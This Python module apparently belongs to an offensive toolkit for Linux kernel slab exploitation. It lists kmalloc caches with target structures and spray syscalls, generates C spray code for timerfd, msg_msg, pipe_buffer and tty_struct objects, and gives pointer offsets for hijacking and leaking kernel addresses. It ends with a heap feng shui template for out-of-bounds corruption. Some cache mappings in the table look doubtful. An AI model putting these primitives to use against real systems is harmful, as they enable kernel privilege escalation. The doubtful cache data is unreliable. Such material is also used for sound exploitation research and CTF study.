"""
Linux kernel slab allocator manipulation.

Provides tools for:
- Understanding slab/kmalloc caches
- Heap spray techniques
- Cross-cache attacks
- Useful kernel structure targets
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class SlabCache:
    """Represents a kmalloc/slab cache."""
    name: str
    size: int
    obj_per_slab: int = 0
    alignment: int = 8

    # Useful structures in this cache
    useful_structs: List[str] = field(default_factory=list)

    # Spray methods
    spray_methods: List[str] = field(default_factory=list)


# Database of kmalloc caches and useful structures
KMALLOC_CACHES = {
    8: SlabCache(
        name="kmalloc-8",
        size=8,
        useful_structs=[],
        spray_methods=["N/A - too small"],
    ),
    16: SlabCache(
        name="kmalloc-16",
        size=16,
        useful_structs=[],
        spray_methods=["N/A - too small"],
    ),
    32: SlabCache(
        name="kmalloc-32",
        size=32,
        useful_structs=[
            "seq_operations",
            "shm_file_data",
        ],
        spray_methods=[
            "open /proc/self/stat for seq_operations",
        ],
    ),
    64: SlabCache(
        name="kmalloc-64",
        size=64,
        useful_structs=[
            "subprocess_info",
            "userfaultfd_ctx",
        ],
        spray_methods=[
            "userfaultfd",
        ],
    ),
    96: SlabCache(
        name="kmalloc-96",
        size=96,
        useful_structs=[
            "msg_msg (header only)",
        ],
        spray_methods=[
            "msgsnd with small data",
        ],
    ),
    128: SlabCache(
        name="kmalloc-128",
        size=128,
        useful_structs=[
            "user_key_payload",
            "setxattr buffer",
        ],
        spray_methods=[
            "add_key",
            "setxattr",
        ],
    ),
    192: SlabCache(
        name="kmalloc-192",
        size=192,
        useful_structs=[
            "sk_buff (header)",
            "fs_context",
        ],
        spray_methods=[
            "socket operations",
            "fsconfig",
        ],
    ),
    256: SlabCache(
        name="kmalloc-256",
        size=256,
        useful_structs=[
            "struct file",
            "timerfd_ctx",
            "sk_filter",
            "ip_options",
        ],
        spray_methods=[
            "timerfd_create + timerfd_settime",
            "open many files",
            "setsockopt IP_OPTIONS",
        ],
    ),
    512: SlabCache(
        name="kmalloc-512",
        size=512,
        useful_structs=[
            "pipe_buffer",
            "user_namespace",
        ],
        spray_methods=[
            "pipe operations",
            "clone with CLONE_NEWUSER",
        ],
    ),
    1024: SlabCache(
        name="kmalloc-1024",
        size=1024,
        useful_structs=[
            "tty_struct",
            "signalfd_ctx",
        ],
        spray_methods=[
            "open /dev/ptmx for tty_struct",
            "signalfd",
        ],
    ),
    2048: SlabCache(
        name="kmalloc-2k",
        size=2048,
        useful_structs=[
            "inode",
        ],
        spray_methods=[
            "create many files",
        ],
    ),
    4096: SlabCache(
        name="kmalloc-4k",
        size=4096,
        useful_structs=[
            "msg_msg (with large data)",
            "sendmsg buffer",
        ],
        spray_methods=[
            "msgsnd with 4k data",
            "sendmsg",
        ],
    ),
}


@dataclass
class SlabAllocator:
    """
    Kernel slab allocator helper.

    Provides information about slab caches and exploitation strategies.
    """

    @staticmethod
    def get_cache_for_size(size: int) -> SlabCache:
        """
        Get the kmalloc cache that would be used for a given size.

        Args:
            size: Allocation size

        Returns:
            Matching SlabCache
        """
        for cache_size in sorted(KMALLOC_CACHES.keys()):
            if size <= cache_size:
                return KMALLOC_CACHES[cache_size]

        # For larger sizes, return a generic cache
        return SlabCache(name=f"kmalloc-{size}", size=size)

    @staticmethod
    def get_useful_structs(slab_name: str) -> List[str]:
        """
        Get useful kernel structures for cross-cache attacks.

        Args:
            slab_name: Cache name (e.g., "kmalloc-256")

        Returns:
            List of structure names
        """
        for cache in KMALLOC_CACHES.values():
            if cache.name == slab_name:
                return cache.useful_structs
        return []

    @staticmethod
    def get_spray_methods(slab_name: str) -> List[str]:
        """
        Get methods to spray allocations in a cache.

        Args:
            slab_name: Cache name

        Returns:
            List of spray method descriptions
        """
        for cache in KMALLOC_CACHES.values():
            if cache.name == slab_name:
                return cache.spray_methods
        return []

    @staticmethod
    def summary() -> str:
        """Get slab cache summary."""
        lines = ["Kernel Slab Caches", "=" * 60]

        for size in sorted(KMALLOC_CACHES.keys()):
            cache = KMALLOC_CACHES[size]
            lines.append(f"\n{cache.name}:")
            lines.append(f"  Useful structs: {', '.join(cache.useful_structs) or 'None'}")
            lines.append(f"  Spray methods: {', '.join(cache.spray_methods) or 'None'}")

        return "\n".join(lines)


@dataclass
class TimerfdSpray:
    """
    Spray kmalloc-256 using timerfd.

    timerfd_ctx is allocated in kmalloc-256 and contains:
    - Function pointer at offset +40
    - Self-referencing list pointer at offset +0x90
    """
    num_timers: int = 64
    timers: List[int] = field(default_factory=list)  # FDs

    # Structure offsets (Linux 5.x)
    FUNC_PTR_OFFSET: int = 40      # timerfd_tmrproc pointer
    LIST_PTR_OFFSET: int = 0x90    # self-referencing list

    def generate_spray_code(self) -> str:
        """Generate C code for timerfd spray."""
        return f'''
// timerfd spray for kmalloc-256
#include <sys/timerfd.h>
#include <time.h>
#include <unistd.h>

#define NUM_TIMERS {self.num_timers}

int timers[NUM_TIMERS];

void spray_timers(struct timespec* basetime) {{
    struct itimerspec ts = {{{{0, 0}}, {{basetime->tv_sec + 100, 1337}}}};

    for (int i = 0; i < NUM_TIMERS; i++) {{
        timers[i] = timerfd_create(CLOCK_REALTIME, 0);
        timerfd_settime(timers[i], TFD_TIMER_ABSTIME, &ts, NULL);
    }}
}}

void free_timer(int idx) {{
    if (idx < NUM_TIMERS && timers[idx] >= 0) {{
        close(timers[idx]);
        timers[idx] = -1;
    }}
}}

// Leak kernel pointer from freed timerfd_ctx
// 1. Create timer
// 2. Close it (frees timerfd_ctx but data remains)
// 3. Allocate vulnerable object in same slot
// 4. Read uninitialized data at offset +40 for timerfd_tmrproc
'''


@dataclass
class MsgMsgSpray:
    """
    Spray using msg_msg structures.

    msg_msg is flexible size and useful for:
    - Heap spray
    - OOB read via msg_copy
    - Arbitrary free
    """
    msg_sizes: List[int] = field(default_factory=list)
    queue_ids: List[int] = field(default_factory=list)

    MSG_HEADER_SIZE: int = 48  # sizeof(struct msg_msg)

    def get_spray_size(self, target_cache_size: int) -> int:
        """Calculate message size to land in target cache."""
        # Actual allocation = sizeof(msg_msg) + data_size
        # For kmalloc-96: data_size = 96 - 48 = 48
        return target_cache_size - self.MSG_HEADER_SIZE

    def generate_spray_code(self) -> str:
        """Generate C code for msg_msg spray."""
        return '''
// msg_msg spray
#include <sys/msg.h>
#include <string.h>

struct spray_msg {
    long mtype;
    char mtext[0];
};

int spray_msgs(int qid, size_t size, int count) {
    struct spray_msg* msg = malloc(sizeof(long) + size);
    msg->mtype = 1;
    memset(msg->mtext, 'A', size);

    for (int i = 0; i < count; i++) {
        if (msgsnd(qid, msg, size, 0) < 0) {
            return -1;
        }
    }
    free(msg);
    return 0;
}

int create_msg_queue() {
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}
'''


@dataclass
class PipeBufferSpray:
    """
    Spray kmalloc-512 using pipe_buffer.

    Useful for kmalloc-512 cross-cache attacks.
    """

    def generate_spray_code(self) -> str:
        """Generate C code for pipe_buffer spray."""
        return '''
// pipe_buffer spray for kmalloc-512
#include <fcntl.h>
#include <unistd.h>

#define NUM_PIPES 64

int pipes[NUM_PIPES][2];

void spray_pipes() {
    for (int i = 0; i < NUM_PIPES; i++) {
        pipe(pipes[i]);
        // Write to create pipe_buffer
        write(pipes[i][1], "A", 1);
    }
}

void free_pipe(int idx) {
    close(pipes[idx][0]);
    close(pipes[idx][1]);
}
'''


@dataclass
class TtyStructSpray:
    """
    Spray kmalloc-1024 using tty_struct.

    tty_struct contains ops pointer that can be hijacked.
    """
    TTY_OPS_OFFSET: int = 0x18  # tty->ops pointer

    def generate_spray_code(self) -> str:
        """Generate C code for tty_struct spray."""
        return '''
// tty_struct spray for kmalloc-1024
#include <fcntl.h>
#include <unistd.h>

#define NUM_TTYS 16

int ptys[NUM_TTYS];

void spray_ttys() {
    for (int i = 0; i < NUM_TTYS; i++) {
        ptys[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    }
}

void free_tty(int idx) {
    close(ptys[idx]);
}
'''


@dataclass
class SlabSpray:
    """
    Combined slab spray utilities.

    Selects appropriate spray method based on target cache size.
    """

    @staticmethod
    def get_spray_for_cache(cache_name: str) -> str:
        """
        Get spray code for a specific cache.

        Args:
            cache_name: e.g., "kmalloc-256"

        Returns:
            C code for spraying
        """
        if cache_name == "kmalloc-256":
            return TimerfdSpray().generate_spray_code()
        elif cache_name == "kmalloc-512":
            return PipeBufferSpray().generate_spray_code()
        elif cache_name == "kmalloc-1024":
            return TtyStructSpray().generate_spray_code()
        else:
            return MsgMsgSpray().generate_spray_code()

    @staticmethod
    def get_all_spray_code() -> str:
        """Get combined spray code for all common caches."""
        return "\n\n".join([
            "/* === Slab Spray Utilities === */",
            TimerfdSpray().generate_spray_code(),
            MsgMsgSpray().generate_spray_code(),
            PipeBufferSpray().generate_spray_code(),
            TtyStructSpray().generate_spray_code(),
        ])

    @staticmethod
    def generate_heap_feng_shui_code(
        target_cache: str,
        vuln_alloc_size: int,
        oob_size: int,
    ) -> str:
        """
        Generate heap feng shui code for OOB exploitation.

        Args:
            target_cache: Target slab cache name
            vuln_alloc_size: Size of vulnerable allocation
            oob_size: Size of OOB read/write

        Returns:
            C code template
        """
        cache_info = SlabAllocator.get_cache_for_size(vuln_alloc_size)

        return f'''
/* Heap Feng Shui for {target_cache} OOB Exploitation
 *
 * Vulnerable allocation: {vuln_alloc_size} bytes ({cache_info.name})
 * OOB access: {oob_size} bytes into next chunk
 * Target structure: See useful_structs for {cache_info.name}
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

// Phase 1: Spray to fill freelist and get consecutive allocations
// This defragments the slab

void phase1_spray() {{
    printf("[*] Phase 1: Spraying {target_cache}...\\n");
    // Spray many objects to fill slab
    // Objects will be allocated consecutively
}}

// Phase 2: Create holes in specific pattern
// Free every other object to create alternating holes

void phase2_create_holes() {{
    printf("[*] Phase 2: Creating holes...\\n");
    // Free specific objects to create holes
    // Next allocation will fill one of these holes
}}

// Phase 3: Allocate vulnerable object
// It will land in one of our holes

void phase3_allocate_vuln() {{
    printf("[*] Phase 3: Allocating vulnerable object...\\n");
    // Allocate the vulnerable object
    // It should be adjacent to a target structure
}}

// Phase 4: Trigger OOB to corrupt adjacent structure
// Read/write into next chunk

void phase4_trigger_oob() {{
    printf("[*] Phase 4: Triggering OOB...\\n");
    // Use the vulnerability to read/write beyond allocation
    // This corrupts the adjacent target structure
}}

int main() {{
    phase1_spray();
    phase2_create_holes();
    phase3_allocate_vuln();
    phase4_trigger_oob();
    return 0;
}}
'''
